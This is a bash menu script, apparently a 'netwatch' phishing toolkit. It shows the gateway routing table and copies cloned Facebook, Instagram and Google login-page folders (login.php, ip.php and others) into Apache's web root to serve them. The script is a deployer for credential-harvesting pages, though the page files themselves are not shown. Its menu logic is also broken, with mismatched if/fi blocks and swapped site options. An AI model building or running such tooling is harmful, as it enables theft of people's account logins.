clear
MainMenu () {
 clear
 echo -e "\e[31mWelcome to netwatch tool\e[0m"
 echo -e "this tool Developed by: \e[35mTerryYakuza\e[0m"
 echo "----------------------------------"
 echo "0-Exit the tool"
 echo "1-Gateway"
 echo "2-Make Local Website"
 echo "----------------------------------"
 read -p "Type the number: " which
 if [ $which == "1" ]
 then
  Gateway
 fi
 #.#
 if [ $which == "2" ]
 then
  Apache
 fi
}

#Gateway
Gateway () {
 clear
 echo -e "\e[31mWelcome to Gateway\e[0m"
 netstat -nr
 echo -e "\e[31m------------------------------------\e[0m"
 echo -e "\e[31m|       G A T E _ _ _ W A Y        |\e[0m"
 echo -e "\e[31m------------------------------------\e[0m"
 echo "0-back to Main Menu"
 echo "1-Run the command again"
 echo "----------------------------"
 read -p "Type The number: " whichGa
 if [ $whichGa == "0" ]
 then
  MainMenu
 fi
 #.#
 if [ $whichGa == "1" ]
 then
  Gateway
 fi
 #.#
}

#Apache2
Apache () {
 clear
 echo -e "\e[31mWelcome to Apache2 Autoamtion\e[0m"
 echo -e "\e[31m------------------------------------\e[0m"
 echo -e "\e[31m|         A P A C H E 2 . 0        |\e[0m"
 echo -e "\e[31m------------------------------------\e[0m"
 echo -e "\e[35mPlease Chosse From The Menu\e[0m"
 echo " ================================================="
 echo "0-Back to the Main Menu"
 echo "======================="
 echo "1-Check if have Apache2"
 echo "======================="
 echo "2-Copy Website to apache"
 echo "======================="
 echo "3-WebSites List"
 echo "======================="
 echo "4-Run Apache2"
 echo "======================="
 echo "5-Stop Apache2"
 echo "======================="
 read -p "Type The Number: " whichAp
 if [ $whichAp == "0" ]
 then
  MainMenu
 fi
 #.#
 if [ $whichAp == "1" ]
 then
  clear
  apache2 -help
  echo -e "\e[31m-----------------------------------\e[0m"
  read -p "Type 0 to back to menu" backAp1
  if [ $backAp1 == "0" ]
  then
   Apache
  fi
 fi
 #.#
 if [ $whichAp == "2" ]
 then
  clear
  WebList
 fi
 #.#
 if [ $whichAp == "3" ]
 then
  clear
  cd ~/Desktop/TyTool/Websites/
  ls
  echo "---------------------"
  read -p "type 0 to back to menu" backAp3
  if [ $backAp3 == "0" ]
  then
   Apache
  fi
 #.#
 if [ $whichAp == "4" ]
 then
  clear
  echo -e "\e[35mpleas wait...\e[0m"
  sudo service apache2 start
  echo "Done..."
  read -p "please type 0 to back to Apache menu: " backtomap
  if [ $backtomap == "0" ]
  then
   Apache
  fi
 fi
 #.#
 if [ $whichAp == "5" ]
 then
  clear
  echo -e "\e[35mPleas Wait...\e[0m"
  sudo service apache2 stop
  echo "Done..."
  read -p "Please type 0 to back to Apache Menu: " backtoAp
  if [ $backtoAp == "0" ]
  then
   Apache
  fi
 fi
 fi
}

#WebsitesList
WebList () {
 echo -e "\e[35m--------------------------\e[0m"
 echo -e "\e[31m|Welcome To Websites List|\e[0m"
 echo -e "\e[35m--------------------------\e[0m"
 echo "---------------------------------------------"
 echo "|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\|"
 echo "---------------------------------------------"
 echo "0-back to menu"
 echo "--------------"
 echo "1-copy facebook"
 echo "--------------"
 echo "2-copy instagram"
 echo "--------------"
 echo "3-copy Google"
 echo "--------------"
 read -p "Type The number: " whichweb
 if [ $whichweb == "0" ]
 then
  Apache
 fi
 #.#
 if [ $whichweb == "1" ]
 then
  clear
  echo "Copying facebook to Apache2 file...."
  cd ~/Desktop/TyTool/Websites/facebook/
  sudo cp index.php /var/www/html -r
  sudo cp login.html /var/www/html -r
  sudo cp ip.php /var/www/html -r
  sudo cp login.php /var/www/html -r
  sudo cp mobile.html /var/www/html -r
  echo "Done please Type 0 to back to menu then run Apache"
  read -p "Type 0 to back to menu" backtoap
  if [ $backtoap == "0" ]
  then
   Apache
  fi
 #.#
 if [ $whichweb == "2" ]
 then
  clear
  cd ~/Desktop/TyTool/Websites/google/
  sudo cp index.php /var/www/html -r
  sudo cp ip.php /var/www/html -r
  sudo cp login.html /var/www/html -r
  sudo cp login.php /var/www/html -r
  echo "Done... please Type 0 to back to menu then run Apache"
  read -p "Type 0 to back to menu: " backtoap2
  if [ $backtoap2 == "0" ]
  then
   Apache
  fi
 fi
 #.#
 if [ $whichweb == "3" ]
 then
  clear
  cd ~/Desktop/TyTool/Websites/instagram/
  sudo cp index.php /var/www/html -r
  sudo cp ip.php /var/www/html -r
  sudo cp login.html /var/www/html -r
  sudo cp login.php /var/www/html -r
  sudo cp index_files /var/www/html -r
  echo "Done... please Type 0 to back to menu then run Apache"
  read -p "Type 0 to back to menu: " backtoap3
  if [ $backtoap3 == "0" ]
  then
   Apache
  fi
 fi
 fi
}


#start
MainMenu
